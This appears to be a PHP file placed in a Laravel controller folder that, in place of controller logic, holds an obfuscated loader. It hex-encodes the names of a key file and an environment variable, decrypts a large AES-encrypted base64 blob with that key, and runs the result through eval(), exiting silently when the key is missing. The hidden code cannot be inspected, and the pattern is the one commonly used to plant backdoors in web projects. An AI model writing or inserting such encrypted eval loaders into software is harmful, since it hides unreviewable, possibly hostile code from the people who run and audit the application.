<?php
namespace App\Http\Controllers\Brimen;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('zjJ5e2XL2X1NsAnRQmurHQ==');

$c=base64_decode(

'BIpKSFHEkIsgWMH5jso8vpqTjcE/eSARxqQ+xP3N9pYDdkE89Ksw7kz+54jDHSYYHPg6ryFH1ij7' .
'BYvq7SaBAV6X8+FFrjU017leIeq7Sdsuz69J8k+Y3Clk2JOww1YyQ8YLZI5EN20GDCM/D+sXWkkP' .
'azAejdBQ9yqz/fR1DXtdfbJpTU+mX+qjifZwsFrIN/GQwf+BXHwmnGdVxMh9+duNKJivetvjb5l3' .
'vnh4FKiS29MWsLrFhIm/bjpLJ7ZDjQtZpz+330wUEYm0MA14NmLVmrN31dYAZHqNTZA0HvJ3Z1Ua' .
'mS19bAnp5bKlflbdXZD5Sl68OH9cPNlIwLz+MbPqK2KkAz3je9Z9BApcuzL83YeJqDdS3rItAy9U' .
'riXkUjBchfDkhcJ8NbctbWKYFMzFSi3adJlUk93MH0WGjyXWI7bRUPDJNJffnRbE5gsQAlVWi/uH' .
'sJyOFXPVyfEaHSeWoqkATKz8VDgeyLV4no7Yt5iQkQtm4FrhSVRiHGwHG7tYhNqwiDtd4QbC6y0u' .
'eHKtfPHBab+ieEmgUWDrSZxLIKz6t/TMWpIA15yGifcUN7pfb4Ira4mfNx2PEMhjGq8HSCtdz+t0' .
'KHKr7KWPUDbpmg9jmFMmxbStOIoeBCZ9eCOpG3VSQWvjpQaBEzQbFu7py3Woc+TbJdLY15C+DYKT' .
'Gso/JSl7hqf8liWd415lBTO4ovyh5rMzoHn9aBqZ4F4KKXPQWi9BLpQQ/Rjg14WUWVHmZYCIpE7Q' .
'GoH7mTDu7ln/gTGrJj5SkXyl0w9IKR/pN1yvQyHreuIvrBAvOb2Jr7XOB/qYdbx7qBNjXCvJFo3r' .
'yhttAkoTyrsxpyfTH/oMkhWN5FNSDSxSen1PBpai5ytfRyAplDePqIgZF8JPehc/MR4l1jYRaSDZ' .
'6yUAoyjGqhU6vcVke9yg0HWaAQekMYtATh8qbrGDai+/uFQnzeVCoivagHhwyaQkZiuGcPXrj5Ya' .
'/I83jYuBOJ+aACIjUs77O4P2b/jKZIoNIFsyhFegSFbOIaZvq5C/ot11lMcMje4N9UfR+p11eq0s' .
'5eqwQKKmoND074ucOxuFCBzo4CbLcD1RDgBXCFYElOhxW3n62QduE0VIcwmW+ggR8HrWTJp2TNw+' .
'GjS1vL0biAqQpsNH2SklhQQZ8S01nzNSrYBTahVC9YGonFm1Yer5JSDIFc+LfYmcM0P18IzWJcur' .
'sQ3ekNFs24TM7ZIp7h/02ZoJbghdkEtRWRaTmNJJOpqAF6KxPI52+1DWqX3c3k13ftoTorMMemHW' .
'5b074+nNV7fF+yZlszydGcjZT/wwVlfVSnI4/qW7OQUk7Li4PJsnFrXw9TOXowPI894PevfZnk4D' .
'BZIQS6pfOwCrBpK+ZPgOn6YSYjjLbBBRZ6wfFA1jHBEBuTUXs9wJuGyUanijAimPlU/kJ3onJllI' .
'0M/MHjZ8s7n3xIBXQE+TNaoHLi3A+b5zjwMQsAMLdZQldPg+USnRFXIYk6DYVAxQ6/6yGai3XDJa' .
'W3wyQySNapt07WlvcVvXirMJcV9GFF0+mamWDBSB0kjL67iPjLQS6d0yaOEuvQczwE6FFPldZOQG' .
'J7f1+u9nHfONOcbH5bqDJwVzp0h8OdDMZB/Kmohpnh9S+9GNaEd8GCOhalT6eHOzzg+iStraJ9UF' .
'C2Gm0RxAGn7J8UGjCryFqYcaaILBqeBU2ua3+xul97CzHBv6y4iVJ7rTaRQJkRT/QEp2R+yT0LN4' .
'N2qxgdFzvGSiSbFbG2WG41daizKEkg29D6ayivnDNxkDL8lv4tYw2xzuhgcNNEdtQsiKnZgV2gZR' .
'e2d2QI4KjE4QgSCI6n7ygSu2DKm1KELlh8BT9bLasmCY+7qaMQI7rVm7rvDdxU2Szl0rvUr9OtVc' .
'guDMg8L5ipKPtIwf42UBBGeo0qzl0s82nDFZlVlmhc6N0KqX7csFLW5XXVaqkFvrWrtcXKHcM5sf' .
'Jm6KFnu1n/0LsHfPs8nh0p9+LFqe9pacxfsjQLH/oeLPnkg76jC7MfyMlYGdUP0M7uhbZirx'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

